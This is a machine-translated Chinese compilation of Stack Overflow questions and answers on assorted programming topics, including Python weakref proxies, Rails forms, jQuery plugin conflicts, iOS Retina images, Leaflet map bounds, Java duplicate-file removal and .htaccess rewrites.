有没有办法从指向它的弱代理中获取原始对象？例如，有相反的`weakref.proxy()`吗？

一个简化的例子（python2.7）：

```
import weakref

class C(object):
    def __init__(self, other):
        self.other = weakref.proxy(other)

class Other(object):
    pass

others = [Other() for i in xrange(3)]

my_list = [C(others[i % len(others)]) for i in xrange(10)] 
```

我需要从中获取唯一`other`成员列表`my_list`。我喜欢这样的任务的方式是使用`set`：

```
unique_others = {x.other for x in my_list} 
```

不幸的是，这抛出`TypeError: unhashable type: 'weakproxy'`

我设法以一种命令式的方式（缓慢而肮脏）解决了特定问题：

```
unique_others = []
for x in my_list:
    if x.other in unique_others:
        continue
    unique_others.append(x.other) 
```

但标题中提到的一般问题仍然存在。如果我只能`my_list`控制并且`others`被埋在某个库中并且有人可能随时删除它们，我想通过在列表中收集**非弱引用来防止删除怎么办？**

或者我可能想获取`repr()`对象本身的，而不是`<weakproxy at xx to Other at xx>`

我想应该有一些`weakref.unproxy`我不知道的事情。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-12T09:26:00.030

基本上有类似的东西`weakref.unproxy`，但它只是命名`weakref.ref(x)()`。代理对象仅用于委托，并且实现相当不稳定......

该`==`功能不像您期望的那样工作：

```
>>> weakref.proxy(object) == object
False
>>> weakref.proxy(object) == weakref.proxy(object)
True
>>> weakref.proxy(object).__eq__(object)
True 
```

但是，我看到您不想一直调用`weakref.ref`对象。具有取消引用支持的良好工作代理会很好。

但目前，这是不可能的。如果你查看你看到的python内置源代码，你需要像[PyWeakref_GetObject](http://hg.python.org/cpython/file/a82fc1f366b4/Objects/weakrefobject.c#l866)这样的东西，但是根本没有调用这个方法（并且：`PyErr_BadInternalCall`如果参数错误，它会引发 a ，所以它似乎是一个内部函数） . [PyWeakref_GET_OBJECT使用得更多，但在](http://hg.python.org/cpython/file/a82fc1f366b4/Include/weakrefobject.h#l69)[weakref.py](http://hg.python.org/cpython/file/2.7/Lib/weakref.py)中没有方法可以做到这一点。

所以，很抱歉让您失望，但您`weakref.proxy`并不是大多数人想要的用例。但是，您*可以*自己`proxy`实现。这并不难。只需在`weakref.ref`内部使用并覆盖`__getattr__`,`__repr__`等。

关于 PyCharm 如何产生正常`repr`输出的一点旁注（因为您在评论中提到了这一点）：

```
>>> class A(): pass
>>> a = A()
>>> weakref.proxy(a)
<weakproxy at 0x7fcf7885d470 to A at 0x1410990>
>>> weakref.proxy(a).__repr__()
'<__main__.A object at 0x1410990>'
>>> type( weakref.proxy(a))
<type 'weakproxy'> 
```

如您所见，调用原始`__repr__`代码真的很有帮助！

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2015-03-22T22:34:12.727

我知道这是一个老问题，但我最近一直在寻找答案并想出了一些东西。就像其他人说的那样，没有记录的方法可以做到这一点，并且查看弱代理类型的实现确认没有标准的方法来实现这一点。

我的解决方案使用了这样一个事实，即所有 Python 对象都有一组标准方法（如**__repr__**），并且绑定的方法对象包含对实例的引用（在**__self__**属性中）。

因此，通过解引用代理来获取方法对象，我们可以从方法对象中获得对被代理对象的强引用。

例子：

```
>>> def func():
...    pass
...
>>> weakfunc = weakref.proxy(func)
>>> f = weakfunc.__repr__.__self__
>>> f is func
True 
```

另一个好处是它也适用于强引用：

```
>>> func.__repr__.__self__ is func
True 
```

因此，如果可以预期代理或强引用，则无需进行类型检查。

**编辑：**

我只是注意到这不适用于类代理。这不是普遍的。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-20T13:29:36.500

weakref.ref 是可散列的，而 weakref.proxy 不是。API 没有说明如何实际获取代理指向的对象的句柄。使用weakref，这很容易，你可以调用它。因此，您可以推出自己的类似代理的类...这是一个*非常*基本的尝试：

```
import weakref
class C(object):
   def __init__(self,obj):
      self.object=weakref.ref(obj)
   def __getattr__(self,key):
      if(key == "object"): return object.__getattr__(self,"object")
      elif(key == "__init__"): return object.__getattr__(self,"__init__")
      else:
          obj=object.__getattr__(self,"object")() #Dereference the weakref
          return getattr(obj,key)

class Other(object):
   pass

others = [Other() for i in range(3)]

my_list = [C(others[i % len(others)]) for i in range(10)]

unique_list = {x.object for x in my_list} 
```

当然，现在 unique_list 包含`ref`s，而不是`proxy`根本不同的 s...

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-03-16T11:43:47.073

我知道这是一个老问题，但我一直被它所困扰（因此，标准库中没有真正的“非代理”）并想分享我的解决方案......

我解决它以获取真实实例的方法只是创建一个返回它的属性（尽管我建议使用`weakref.ref`而不是`weakref.proxy`as 代码应该在访问它之前真正检查它是否仍然存在，而不必记住在任何属性时捕获异常被访问）。

无论如何，如果您仍然**必须**使用代理，获取真实实例的代码是：

```
import weakref

class MyClass(object):

    @property
    def real_self(self):
        return self

instance = MyClass()
proxied = weakref.proxy(instance)
assert proxied.real_self is instance 
```

# ruby - 从 select_tag 传递值

> ID：10246119
> 
> 赞同：0
> 
> 时间：2012-04-20T12:19:13.590
> 
> 标签：ruby, ruby-on-rails-3, ruby-on-rails-3.1

我想将选定的 :ammount 值作为 :quantity 传递给我的控制器。我做错了什么？

```
<%= label(:ammount, "Ammount:") %>
<%= select_tag(:ammount, options_for_select([1,2,3,4,5,6,7,8,9,10])) %>

<%= button_to 'Add to cart', line_items_path(:product_id => product.id, :quantity => :ammount) %> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T12:33:28.137

您应该在此处使用表单将数据传递给控制器​​的操作：

```
<%= form_tag line_items_path(:product_id => product.id) do %>
  <%= label(:ammount, "Ammount:") %>
  <%= select_tag(:ammount, options_for_select([1,2,3,4,5,6,7,8,9,10])) %>
  <%= submit_tag 'Add to cart' %>
<% end %> 
```

您在源代码中所做的只是将符号`:ammount`作为数量参数传递给控制器​​的操作。

# computer-vision - 图像非矩形部分的 FFT

> ID：10246123
> 
> 赞同：1
> 
> 时间：2012-04-20T12:19:31.620
> 
> 标签：computer-vision, fft

我需要对图像进行 FFT 以降低噪声，但问题是我不需要完整的图像，而只需要中间的一个圆圈。边界是固定的，因此我对它显示的内容不感兴趣，但它会对 FFT 的结果产生影响。

有什么方法可以切出一个圆形部分并将其用于 FFT？请注意，如果我使用黑色背景，背景和图像数据之间的边缘会产生相当大的影响。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T20:48:08.730

这在信号处理上得到了回答（http://dsp.stackexchange.com/questions/2130/fft-on-non-rectangular-part-of-image）。

# ios - UISegmentedControl 段大小触摸检测

> ID：10246124
> 
> 赞同：1
> 
> 时间：2012-04-20T12:19:33.023
> 
> 标签：ios, touch, uisegmentedcontrol

我创建了一个分段控制器，它具有不同大小的段。当我检查时，我看到段控制器具有不同宽度大小的段，但是当我尝试触摸最大的段时，它只能在段的左侧被触摸。（可能只是前 50 px 部分，但段是 160 px）。如何设置段的可触摸区域？

```
//My header file:        
#import <UIKit/UIKit.h>
@interface Form1 : UIViewController <UIAlertViewDelegate>{
IBOutlet UISegmentedControl *combobox6001;
}
@property (nonatomic, strong) IBOutlet UISegmentedControl *combobox6001;
@end

#import "Form1.h"
@implementation Form1
@synthesize combobox6001;
- (void) viewWillAppear:(BOOL)animated {
    [super viewWillAppear:animated];
    [combobox6001 setWidth:50  forSegmentAtIndex:0];
    [combobox6001 setWidth:50  forSegmentAtIndex:1];
    [combobox6001 setWidth:160 forSegmentAtIndex:2];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:26:20.947

我自己也遇到过同样的问题...事实证明，如果您在设置分段宽度之前不设置分段控件本身的宽度，那么您会在这里遇到同样的问题。这是在我的代码中解决此问题的示例（希望对您有所帮助！）：

```
 [topSegmentedControl setFrame:CGRectMake(5.0, 5.0, frame.size.width - 26.0, topSegmentedControl.frame.size.height)];

    float width1 = round(topSegmentedControl.frame.size.width * 0.125);
    float width2 = round(topSegmentedControl.frame.size.width * 0.175);
    float width3 = round(topSegmentedControl.frame.size.width * 0.275);
    float width4 = topSegmentedControl.frame.size.width - (width1 + width2 + width3 + 3.0);

    [topSegmentedControl setWidth:width1 forSegmentAtIndex:0];
    [topSegmentedControl setWidth:width2 forSegmentAtIndex:1];
    [topSegmentedControl setWidth:width3 forSegmentAtIndex:2];
    [topSegmentedControl setWidth:width4 forSegmentAtIndex:3]; 
```

# apprequests - 如何知道应用程序发送的每个请求

> ID：10246133
> 
> 赞同：1
> 
> 时间：2012-04-20T12:19:42.947
> 
> 标签：apprequests

我想开发一个为我的客户提供警报消息的应用程序。

他们是一个名为 ODIN DIET 的应用程序，它带来了盘中数据。

我使用 Fiddler 查看 ODIN DIET 发送的请求，但 ODIN DIET 发送 http

请求仅用于登录目的而不是为了任何我认为 ODIN Diet 正在从

另一个来源，如 ftp 或从某处下载数据。

说到重点，我想知道 ODIN DIET 发送的每个请求，例如 HTTP、FTP 和所有

其他来源。

注意：-ODIN DIET 每秒都会从某个地方带来数据。而且我使用了提琴手，但它没有帮助我，因为它没有发送 http 请求。

如果有人可以帮助我，将不胜感激。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T12:22:49.643

我建议查看Microsoft 收购的一些 SysInternals 工具 ( [Technet Link )。](http://technet.microsoft.com/en-us/sysinternals/bb545021)具体来说，过程监视器可能会做你想要的。您可以使用它查看应用程序对所有文件和注册表的访问。

# business-rules - RTS 同步禁用 ILOG Jrules 中的 BOM

> ID：10246140
> 
> 赞同：0
> 
> 时间：2012-04-20T12:20:13.157
> 
> 标签：business-rules, ilog, jrules

我将我的规则项目与另一台机器上的规则团队服务器同步。然后从 RTS 的另一台机器上签出规则项目。我从第二台机器向 BOM 中添加了一个新成员。然后将其同步到 RTS。现在来到我的第一台机器，我同步了规则项目。我得到了更新的 BOM 条目，但是我的 BOM 有点被阻止了。双击任何 BOM 中的成员不允许我编辑它！这是 Rule Studio 中的错误还是我做错了同步？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-25T11:27:44.253

请提供更多详细信息...
据我所知，如果您在项目中设置了一些安全性，那么只有规则集签名将被排除在同步之外（让我们称之为 RTS 的功能）您说 BOM...您是否关注有 BOM 项目和规则项目的良好实践？
它在这里没有多大帮助，但这真的很好。

JRules（Studio 和 RTS）的同步有点棘手
1/您从 PC-a 部署到 PC-c（RTS 所在的位置）
2/从 PC-b 您从 PC-c（RTS）导入规则项目
3/您在项目中添加 BOM 成员或其他任何内容
4/您从 PC-b“发布”到 PC-c
5/dbl-chk 您的 BOM 更改存在于 RTS 中6/您 现在将
PC-a 与 PC-c 同步
问题
正常出现，您应该看到更改，因此“更新”（而不是“发布”）更改
，因此 PC-c 中的文件将覆盖 PC-a 中的文件
查看箭头方向（输入/输出或 RED => 手动检查)
如果您有分开的项目，那么您需要检查的东西就更少了，而且您知道要检查什么

我同意，同步可能很烦人:)
希望它有所帮助

# jquery - jQuery插件LavaLamp和jQuery循环之间的冲突

> ID：10246142
> 
> 赞同：1
> 
> 时间：2012-04-20T12:20:27.220
> 
> 标签：jquery, cycle, lavalamp

我怀疑 jQuery 插件 LavaLamp 和 jQuery 插件循环之间存在冲突。在我添加循环所有脚本之前，lavalamp 运行良好

工作 lavalamp 菜单的 URL 是[http://www.eastover.plus.com/consultantnet](http://www.eastover.plus.com/consultantnet)

带有 jQ​​uery 循环的 lavalamp 菜单的 URL 是[http://www.eastover.plus.com/consultantnet/slideshow.html](http://www.eastover.plus.com/consultantnet/slideshow.html)

有人知道我做错了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:26:07.130

问题是您不止一次地包含了 jQuery 脚本文件。具体来说，导致您的问题的原因是您在加载LavaLamp 插件*后*加载了一次 jQuery，从而覆盖了`$`已使用插件扩展的定义。

```
<!-- jQuery is first included here; $ is defined -->
<script type="text/javascript" src="sitefiles/jquery.js"></script>
<script type="text/javascript" src="sitefiles/easing.js"></script>
<script type="text/javascript" src="sitefiles/easingfix.js"></script>

<!-- then your LavaLamp plugin is included here; $.fn.LavaLamp is defined -->
<script type="text/javascript" src="sitefiles/lavalamp.js"></script>
<script type="text/javascript" src="sitefiles/imagecycle.js"></script>
...

<!-- Now, later on, jQuery is included again; $ is overwritten
     and $.fn.LavaLamp is lost -->
<script type="text/javascript" src="js/jquery.min.js"></script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:31:41.583

您有 2 行包含 jquery.js。您只能有 1。此外，您在此行中的命名错误：`<ul id="1" class="lavaLamp">`. 您可以将其重命名为`id="menu1"`.

# jquery - jquery如果条件问题

> ID：10246144
> 
> 赞同：0
> 
> 时间：2012-04-20T12:20:36.260
> 
> 标签：jquery

我有一个推送数组的功能，但我遇到了问题，因为我的条件总是一起检查。除此之外，如果我使用花括号，我将创建数组编号。次。即使我无法在这里正确解释，请查看我的代码：

```
$.map(pObj,function(values,i){
    if(typeof pieArray[values.GeoID] == 'undefined')
        pieArray[values.GeoID] = []; //it should create only one time

    pieArray[values.GeoID].push(values.ResponsePercentage); // when it matches it should not go down to check next if. else it can go.

    if(!values.GeoID && typeof pieArray[0] == 'undefined')
        pieArray[0] = []; //it should create only one time

    pieArray[0].push(values.ResponsePercentage); //now the top if get response, till it is checking and throwing error. top if not match, then it need to work.
}); 
```

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T12:27:55.577

如果我正确理解您的问题，您只需要使用控制块 ( `{}`)。

```
$.map(pObj,function(values,i) {
        if(typeof pieArray[values.GeoID] == 'undefined') {
           //it should create only one time
           pieArray[values.GeoID] = [];
           // when it matches it should not go down to check next if. else it can go.
           pieArray[values.GeoID].push(values.ResponsePercentage);
        }
        if(!values.GeoID && typeof pieArray[0] == 'undefined') {
           //it should create only one time
           pieArray[0] = [];
           //now the top if get response, till it is checking and throwing error. top if not match, then it need to work.
           pieArray[0].push(values.ResponsePercentage);
       }
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:49:02.137

我确实喜欢这个。它工作正常。

```
var pieArray = [];
var allIndia = false; //using as a key.

$.ajax({
        cache: false,
        type: "GET",
        async: false,
        url: url,
        dataType: "jsonp",
        success: function (pObj) {
        $.map(pObj,function(values,i){
            if(typeof pieArray[values.GeoID] == 'undefined') pieArray[values.GeoID] = [],allIndia = false;//making false
            pieArray[values.GeoID].push(values.ResponsePercentage);

            if(!values.GeoID && typeof pieArray[0] == 'undefined') pieArray[0] = [], allIndia = true;//making true, so it will not go down the first condition matches.
            if(allIndia) {pieArray[0].push(values.ResponsePercentage)};
        })
        pieArray = $.grep(pieArray,function(n){
            return(n);
        });
        console.log(pieArray);
        makePieChart();
        },
        error: function (err) {
        //console.log(err);
        }
    }); 
```

谢谢大家。

# iphone - 视网膜显示图像

> ID：10246147
> 
> 赞同：0
> 
> 时间：2012-04-20T12:20:55.047
> 
> 标签：iphone, xcode, retina-display

如果我希望我的应用程序与 Retina 显示器兼容，我是否必须通过将它们的大小加倍来重新创建所有图像？甚至图标？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T12:53:04.287

如果您不使用高分辨率图像，您的图像会看起来像素化/模糊。所以最好也使用高分辨率图像。一些关键点是：

*   根据设备型号显示图形可以通过复制图像文件并添加“@2x”后缀来完成。因此，当普通图像文件命名为“button.png”时，高分辨率版本应为“button@2x.png”。
*   您不需要任何额外的代码。在 Interface Builder 或您的代码中，将正常版本（不带后缀）分配给对象。***应用程序图标也是如此。2x 图标的分辨率应为 114 x 114 像素。您需要在 Info.plist 文件中为此图标添加一个单独的“图标”属性。***
*   如果出于某种原因您确实想要在代码中执行检查，您可以通过检查显示的比例因子来实现。旧型号将返回 1.0 的比例因子，而 iPhone 4 将返回 2.0。您可以通过以下方式检查：

**浮动因子 = [UIScreen mainScreen].scale;**

根据您正在开发的应用程序类型，可以进行进一步优化，以尽可能地利用新的视网膜显示器。

[一个非常好的信息here](http://www.smashingmagazine.com/2010/11/17/designing-for-iphone-4-retina-display-techniques-and-workflow/)

希望它对你有帮助:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T12:22:46.307

你没有义务，如果你不这样做，它只会看起来非常像素化。

至于图标，我相信您在提交到 AppStore 时有义务提供多种尺寸。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T12:23:35.343

也许你会想看看[iRetiner](http://www.iynnis.com/4093-iretiner-adapting-the-icons-of-your-applications-to-retinal-display-cydia/)。

您还可以查看以前的 stackoverflow 线程：[如何为支持视网膜显示的 ipad 应用程序设置图像](https://stackoverflow.com/questions/9920353/how-to-set-image-for-ipad-application-that-support-retina-display)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-20T12:25:16.467

可以在[人机界面指南](http://developer.apple.com/library/ios/#documentation/userexperience/conceptual/mobilehig/IconsImages/IconsImages.html)中找到图标摘要和所需内容。我强烈建议为 Retina 显示器提供高分辨率图稿，即使它不是必需的。您现在的默认设置应该是以更高分辨率设计图稿，然后按比例缩小以适应旧设备。如果它在最新设备上看起来像素化，我怀疑 Apple 会选择突出显示新的和值得注意的应用程序。

# java - 如何从特定目录中删除重复文件

> ID：10246152
> 
> 赞同：-1
> 
> 时间：2012-04-20T12:21:16.883
> 
> 标签：java, duplicate-removal

我想计算没有出现字符串的文件，并且我在目录中有一个文档列表，但它们是多余的。如何从该特定目录中删除重复文件？任何帮助表示赞赏！

```
 public static boolean CompareFiles(File x, File y) throws FileNotFoundException 
 { //boolean result=true;

    try     {
       Scanner xs = new Scanner(x);
       Scanner ys = new Scanner(y);
       boolean result = true;
       while (result)
       {
           if (xs.nextByte() != ys.nextByte()) result = false;

       }

return result;
    }
catch (FileNotFoundException e) 
{
    System.out.println(e.getMessage());
    return false;
}
}

public static void main(String[] args) throws FileNotFoundException, IOException//     
    { 

    File dir = new File("C:/Users/Aravind/Documents/ranked");
    File[] fileList = dir.listFiles();
    for (int x = 0; x <fileList.length; x++)
    {
    for (int y = x+1; y < fileList.length; y++)
    {
    if (CompareFiles(fileList[x],fileList[y])) 
    {
        System.out.println("in calling fn");
        fileList[x].delete();
    }
        //System.out.println(fileList[x]);
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T12:47:55.733

使用文件名作为键和文件的校验和作为值创建映射（按照此[示例](http://www.rgagnon.com/javadetails/java-0416.html)使用 java 获取文件的校验和）。

在向该映射添加新条目之前，检查计算的校验和是否已经存在`containsValue`（如果两个文件具有相同的校验和，则它们的内容相同）。

删除“冗余”文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:35:29.950

```
for (File f : dir.listFiles()) if (isDuplicate(f)) f.delete(); 
```

......或者也许给我们更多关于你需要什么的细节。

# javascript - Leaflet.js - 在地图视图上拟合 geoJSON 坐标

> ID：10246157
> 
> 赞同：20
> 
> 时间：2012-04-20T12:21:29.023
> 
> 标签：javascript, geojson

我有一个 Leaflet.js 地图，上面有来自外部 JSON 文件的点和线串。

如果我添加： map.setView(new L.LatLng(0,0), 10);

它将以纬度和经度 0,0 为中心定位地图。如何设置它以使地图中心和缩放适合 JSON 中的所有点？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-04-20T14:14:29.777

您可以将所有图层添加到具有`getBounds`方法的 FeatureGroup。所以你应该可以说`myMap.fitBounds(myFeatureGroup.getBounds());`

L.FeatureGroup 的 getBounds 方法至少目前仅在 master 分支中可用（不是最新版本，0.3.1）。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2014-06-21T15:43:43.507

和我类似的情况。我从*GeoJson*数据中绘制了所有*标记。*所以我写了这个函数，它在按钮点击时被重复调用。只要尝试它是否适合您的要求。

 *```
 function bestFitZoom()
    {
        // declaring the group variable  
        var group = new L.featureGroup;

        // map._layers gives all the layers of the map including main container
        // so looping in all those layers filtering those having feature   
        $.each(map._layers, function(ml){

           // here we can be more specific to feature for point, line etc.            
            if(map._layers[].feature) 
             {
                 group.addLayer(this)
             }
         })

         map.fitBounds(group.getBounds());
    } 
```

编写此函数的最佳用途是即使地图/标记的状态发生变化，它也会获得标记/图层的最新/当前状态。每当调用此方法时，所有图层都将以适度的缩放级别可见。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-06T22:53:51.747

在向用户显示从起点到目的地的路线时，我需要这样做。`L.LatLng`我将我的方向列表存储在一个被调用的数组中，`directionLatLngs`然后你可以简单地调用

```
map.fitBounds(directionLatLngs); 
```

这是有效的，因为`map.fitBounds`它需要一个`L.LatLngBounds`对象，它只是一个数组`L.LatLng`

[http://leafletjs.com/reference.html#latlngbounds](http://leafletjs.com/reference.html#latlngbounds)*

# objective-c - 指向整数转换的不兼容指针将 viewcontroller * 发送到 BOOL 类型的参数

> ID：10246163
> 
> 赞同：0
> 
> 时间：2012-04-20T12:21:51.770
> 
> 标签：objective-c, ios5, xcode4.2

我试图弄清楚如何读取存储在 Web 服务器上的文本文件并在文本视图中显示内容。我遵循了 Apple 网站[NSURLConnection](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/URLLoadingSystem/Tasks/UsingNSURLConnection.html)中关于如何建立 NSURLConnection 和 receiveData 并显示接收到的数据的文档。

我创建了一个按钮，我想在按钮单击时加载文本视图。为此我写了这个方法

```
- (void)loadWeb:(BOOL)animated
{
    NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:@"http://nowayweb.com/mytext.txt"] cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:30.0];

    NSURLConnection *myConnection = [[NSURLConnection alloc] initWithRequest:request delegate:self];

    if (myConnection) {
        downloadedData = [[NSMutableData data] retain];
    }
    else{

        NSLog(@"Error");
    }
} 
```

但是我在我的 .m 文件中收到一条警告，可以在屏幕截图中看到，如下所示： ![警告截图](../Images/74d25a86dd3771c98efe9687228d716b.png)

它工作正常，我可以在文本视图中查看文本，但我想知道我在哪里犯了错误。如果有人对此有所了解，将会有所帮助。

或者有没有更好的方法通过按钮单击从 Web 加载内容。任何帮助表示赞赏。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T12:37:31.513

ObjC`BOOL`不是真正的布尔类型。它是 a 的 typedef `signed char`。

该方法的签名是：

```
- (void)loadWeb:(BOOL)animated 
```

该表达式`[self loadWeb:self];`没有意义，也不是真正的`bool`转换。编译器会警告您正在将指针转换为`signed char`.

它应该是：

```
[self loadWeb:YES]; 
```

-或者-

```
[self loadWeb:NO]; 
```

-或者-

```
BOOL someBOOLVariableOrParameter = ...; // YES or NO
[self loadWeb:someBOOLVariableOrParameter]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:37:37.890

`self`是指向对象的指针，而不是 BOOL 值。你应该做这个：

```
[self loadWeb: YES]; 
```

除了您的方法似乎无论如何都没有使用该参数，因此您不妨摆脱它。

```
[self loadWeb]; 
```

和

```
- (void)loadWeb
{
    // all the stuff inside
} 
```

它为您工作的原因是a）您没有使用参数，b）编译器将`self`通过切断除指针的最低有效字节之外的所有字节来自动转换为BOOL。如果您一直在使用该参数，那么大部分时间都是`YES`偶然的，偶尔也是`NO`偶然的。

# google-maps-api-3 - Google Maps API V3：4 月 27 日之后的结果很好，然后结果很差

> ID：10246168
> 
> 赞同：0
> 
> 时间：2012-04-20T12:22:08.610
> 
> 标签：google-maps-api-3

我有一个应用程序已经运行 Google Maps API v.3 大约 6 周了，之前我们使用的是 v.2。

我们的应用程序在主页上列出了 15 个随机结果，并且做得很好。但随后在 2012 年 4 月 17 日；我们只能得到有限的结果（不超过 9 个）。

这是网址：[www.searchsearch.com](http://www.searchsearch.com)

在那个日期前后是否有任何更新可能影响了我们的源代码，从而“限制”了我们的调用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T18:19:00.357

您请求 placeDetails，（对我来说有 18 个位置），但所有 Maps-Webservices 都有一个一般限制（每秒 10 个请求），因此您只会收到 10 个响应。

[https://developers.google.com/maps/documentation/business/faq#js_usage_limits](https://developers.google.com/maps/documentation/business/faq#js_usage_limits)

您可以在每 10 个位置后使用超时来获取更多详细信息。

# java - 从服务访问静态变量

> ID：10246171
> 
> 赞同：2
> 
> 时间：2012-04-20T12:22:17.173
> 
> 标签：java, android, variables, static

我的应用程序有一个服务，我`MainActivity`有一个`static`变量：

```
public static boolean appIsPlaying = false; 
```

我的服务代码是这样的：

```
MainActivity.appIsPlaying = false; 
```

这段代码运行良好，但我不确定它是否正确。那么，如果这个解决方案有问题，你会帮助我吗？

谢谢

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-20T13:55:32.690

我真的不同意那些说让我们对所有事情都使用 getter 和 setter 的人，这就是解决方案。您的解决方案很简单，但很有效。服务和活动本身之间的这种通信方式没有问题。这不是一些公共 API，因此使用公共字段并不是绝对的禁忌。

只有当您必须满足某些要求时，才会出现问题。这个 from of 交互是最简单的，因此它不能做太多事情。例如，如果你想监听改变值的事件，那么你会遇到问题，因为你只是设置了值，并没有通知活动。

如果是这种情况，那么您可以[绑定到服务](http://developer.android.com/guide/topics/fundamentals/bound-services.html)，并实现更复杂的交互。可以通过将侦听器存储在服务中并在发生更改时通知它们来侦听值更改。

没有真正*的*方法可以做到这一点，有更合适的方法和更少的方法。您必须根据需要选择其中之一。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T12:29:14.597

将您的静态变量放在实用程序类中，并创建具有所需验证的静态 getter 和 setter。制作类 Single Instance 也是首选，但您做对的事情并非没有问题。

# php - htaccess - 适用于本地，但不适用于远程服务器

> ID：10246173
> 
> 赞同：1
> 
> 时间：2012-04-20T12:22:26.140
> 
> 标签：php, .htaccess

我有[这个](http://test.gieromaniak.pl)页面和*.htaccess*的内容：

```
RewriteEngine On

RewriteRule ^images/(.*) public_html/images/$1 [PT,L]
RewriteRule ^temp/(.*) public_html/temp/$1 [PT,L]
RewriteRule ^css/(.*) public_html/css/$1 [PT,L]
RewriteRule ^js/(.*) public_html/js/$1 [PT,L]
RewriteCond %{REQUEST_URI} !^/public_html/
RewriteRule ^(.*)$ public_html/index.php/$1 [PT,L,NC,QSA] 
```

问题是，上面的*.htaccess*代码在我的本地服务器上运行，但不在远程服务器上运行。

例如：
此链接：[http](http://test.gieromaniak.pl/gallery)
://test.gieromaniak.pl/gallery 的外观和工作方式应如下所示：[http ://test.gieromaniak.pl/public_html/index.php/gallery](http://test.gieromaniak.pl/public_html/index.php/gallery)

有什么问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T13:52:37.707

您是否自己创建了 public_html 文件夹？如果是这样，那不是您的 web 根目录，htaccess 应该位于 web 根目录中，可能是 public_html 文件夹的上一级。

也许您将整个 public_html 文件夹复制到您的虚拟主机，您应该刚刚上传了 public_html 文件夹的*内容*？

# ios - 使用仪器进行 iOS 测试 - 最佳实践

> ID：10246188
> 
> 赞同：1
> 
> 时间：2012-04-20T12:23:26.903
> 
> 标签：ios, testing, mobile, instruments

由于我正在开发基于 iOS 的应用程序，因此我也花了很多时间开始测试应用程序和调试性能问题。

在阅读了仪器用户指南之后，我现在能够检测内存泄漏、记录当前内存大小和 cpu 使用率等等，这对安静有很大帮助！

现在，为了改进我的测试策略，我正在为不同的仪器寻找一种基准值或标准值（例如 CPU 使用率、能耗……）。你知道我的意思？例如：我在 10 秒内的 CPU 使用率为 80%。可以吗，还是我应该考虑性能优化？当然，在 cpu 使用的情况下，它取决于应用程序在这段时间内执行的操作（例如重新加载一些数据或类似的东西），但有没有经验法则或最佳实践？

我已经在互联网上进行了研究，只找到了 Michael Jurewitz 在伦敦的 iOS 技术演讲视频。在那次演讲中，我发现了以下对我有用的陈述：

*   活动监视器：只能用于比较您的应用与其他应用的资源使用情况
*   分配：不断增长的分配图表显然是内存泄漏的不良信号。分配不显示应用程序使用的实际内存大小
*   VM Tracker：显示整体内存大小；经验法则：应用程序的脏大小超过 100 MB 实在是太多了
*   ...

现在我需要一些“经验法则”，尤其是对于 CPU 监视器（好案例和坏案例之间的边界在哪里？）和能耗（级别..？）。

你对我有什么建议或者你知道一些我可以阅读的文章吗？

非常感谢！

菲利普

# android - 以编程方式清除 laucher 默认值

> ID：10246193
> 
> 赞同：0
> 
> 时间：2012-04-20T12:23:41.010
> 
> 标签：android, permissions, default, launcher

我正在尝试删除默认的 laucher 参数（让用户选择另一个应用程序）`android.permission.SET_PREFERRED_APPLICATIONS`。我在谷歌上搜索说这是不可能的，但是有一个使用这种技术的 Kidzone 应用程序（http://www.kidzoneapp.com/ 参见 youtube 视频）。

我现在正在尝试清除默认值

```
pm.clearPackagePreferredActivities("com.fede.launcher"); 
```

但收到此错误：

```
04-20 16:05:50.272: E/AndroidRuntime(6926): Caused by: java.lang.SecurityException: Neither user 10070 nor current process has android.permission.SET_PREFERRED_APPLICATIONS.2 
```

好的，如果我无法清除启动器默认值，我如何检测现在默认的启动器，然后打开应用程序->管理应用程序->启动器名称对话框？(http://hothardware.com/articleimages/Item1525/small_move-to-sd-card-froyo.png) 用户可以自己清除默认设置

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:58:18.753

> 我正在尝试删除默认的 laucher 参数（让用户选择另一个应用程序）

那已经不可能了。

> 有一个使用这种技术的 Kidzone 应用程序（http://www.kidzoneapp.com/ 参见 youtube 视频）。

它适用于允许这样做的旧版本的 Android。

> 此外，它在清单中具有相同的权限。

如今，该权限已不再使用，只能由使用与用于签署固件相同的签名密钥签署的应用程序持有。

# html - 附加到网站的字体不适用于苹果设备

> ID：10246198
> 
> 赞同：0
> 
> 时间：2012-04-20T12:24:10.850
> 
> 标签：html, css

我在我的网站中使用链接 ----- rel="FONTDEF" src="calibri.ttf" ----。这些字体在 windows 计算机上工作，而在 mac、ipad 和 iphone 上不起作用。任何人都可以帮忙吗？

* * *

